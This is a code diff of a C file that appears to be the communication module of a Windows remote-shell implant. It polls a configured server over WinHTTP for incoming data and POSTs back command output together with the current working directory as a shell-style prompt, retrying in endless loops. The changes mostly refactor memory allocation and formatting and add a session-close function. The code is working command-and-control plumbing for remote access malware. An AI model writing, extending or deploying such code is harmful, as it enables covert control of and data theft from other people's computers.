@@ -1,13 +1,14 @@
 #include "connection.h"
-#include <stdio.h>
 
 #include CONFIG
+#include "helper.h"
 
 void initConnection()
 {
     while(TRUE)
     {
-        HINTERNET hSession = WinHttpOpen(L"HSH", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+        hSession = WinHttpOpen(L"HSH", WINHTTP_ACCESS_TYPE_NO_PROXY, 
+                                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
         if(!hSession)
         {
 #ifdef DEBUG
@@ -46,21 +47,32 @@ void sendData( char* data , char* curPath)
     LPCWSTR accTypes[] = { L"*/*", 0x00 };
 
     // Prepare Payload
-    char* fmt = "get_data={\"output\": \"%s\", \"getcwd\": \"%s> \"}";
-    size_t payloadSize = strlen(fmt) + strlen(data) + strlen(curPath) - 3;
-    char* payload = (char *) malloc(payloadSize);
-    sprintf(payload, fmt, data, curPath);
+    char* finalDataFmt = "get_data=%s";
+    char* payloadFmt = "{\"output\": \"%s\", \"getcwd\": \"%s> \"}";
+    size_t payloadSize = strlen(payloadFmt) + strlen(data) + strlen(curPath) - 3;
+    char* payload = mallocBlock(payloadSize);
+
+    sprintf(payload, payloadFmt, data, curPath);
     char* encodedPayload = urlencode(payload);
+
     free(payload);
 
-    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\n";
+    char* finalData = mallocBlock(strlen(encodedPayload)+strlen(finalDataFmt)-1);
+    sprintf(finalData, finalDataFmt, encodedPayload);
+    free(encodedPayload);
+
+    puts(finalData);
+
+    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n"\
+                      L"Connection: keep-alive\r\n";
 
     BOOL err;
 
     while( TRUE )
     {
 
-        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", PATH,  NULL, WINHTTP_NO_REFERER, accTypes, 0);
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", PATH,  NULL, 
+                                                WINHTTP_NO_REFERER, accTypes, 0);
         if(!hRequest)
         {
 #ifdef DEBUG
@@ -70,7 +82,8 @@ void sendData( char* data , char* curPath)
             continue;
         }
 
-        err = WinHttpSendRequest(hRequest, headers, wcslen(headers), encodedPayload, strlen(encodedPayload), strlen(encodedPayload), 0);
+        err = WinHttpSendRequest(hRequest, headers, wcslen(headers), finalData, 
+                                 strlen(finalData), strlen(finalData), 0);
         if(err != 1)
         {
 #ifdef DEBUG
@@ -94,7 +107,10 @@ void sendData( char* data , char* curPath)
 
 		DWORD statusCode = 0;
 		DWORD statSize = sizeof(statusCode);
-        err = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statSize, WINHTTP_NO_HEADER_INDEX);
+        err = WinHttpQueryHeaders(hRequest, 
+                                  WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
+                                  WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statSize, 
+                                  WINHTTP_NO_HEADER_INDEX);
 
 #ifdef DEBUG
         if(err != 1)
@@ -115,7 +131,7 @@ void sendData( char* data , char* curPath)
         break;
     }
 
-    free(encodedPayload);
+    free(finalData);
 }
 
 
@@ -137,7 +153,8 @@ char* getData()
 
     while(TRUE)
     {
-        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, NULL, WINHTTP_NO_REFERER, accTypes, 0);
+        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, NULL, 
+                                                WINHTTP_NO_REFERER, accTypes, 0);
         if(!hRequest)
         {
 #ifdef DEBUG
@@ -171,8 +188,11 @@ char* getData()
 
         DWORD contentLen = 0;
         DWORD contentLenSize = sizeof(contentLen);
-        err = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &contentLen, &contentLenSize, WINHTTP_NO_HEADER_INDEX);
-        if( err != 1 || contentLen == 0)
+        err = WinHttpQueryHeaders(hRequest, 
+                                  WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER,
+                                  WINHTTP_HEADER_NAME_BY_INDEX, &contentLen, 
+                                  &contentLenSize, WINHTTP_NO_HEADER_INDEX);
+        if( err != 1)
         {
 #ifdef DEBUG
             fprintf(stderr, "Query Header Error: %ld\n", GetLastError());
@@ -181,15 +201,22 @@ char* getData()
             Sleep(1000);
             continue;
         }
+        if( contentLen == 0 )
+        {
+            buffer = NULL;
+            break;
+        }
 
-        buffer = (char*) malloc(contentLen);
+        buffer = mallocBlock(contentLen);
+
         DWORD recieved = 0;
         err = WinHttpReadData(hRequest, buffer, contentLen, &recieved);
 #ifdef DEBUG
         if(err != 1)
             fprintf(stderr, "Read Data Error: %ld\n", GetLastError());
         else if(recieved != contentLen)
-            fprintf(stderr, "Not Enough Read\n\tContent-Length: %ld\n\tRecieved: %ld\n", contentLen, recieved);
+            fprintf(stderr, "Not Enough Read\n\tContent-Length: %ld\n\tRecieved: %ld\n", 
+                    contentLen, recieved);
 #endif
         WinHttpCloseHandle(hRequest);
 
@@ -210,7 +237,7 @@ char* getData()
 char* urlencode(char* originalText)
 {
     // allocate memory for the worst possible case (all characters need to be encoded)
-    char *encodedText = (char *)malloc(sizeof(char)*strlen(originalText)*3+1);
+    char* encodedText = (char *) mallocBlock(sizeof(char)*strlen(originalText)*3+1);
     
     const char *hex = "0123456789abcdef";
     
@@ -228,4 +255,11 @@ char* urlencode(char* originalText)
     }
     encodedText[pos] = '\0';
     return encodedText;
+}
+
+
+void closeSession()
+{
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
 }
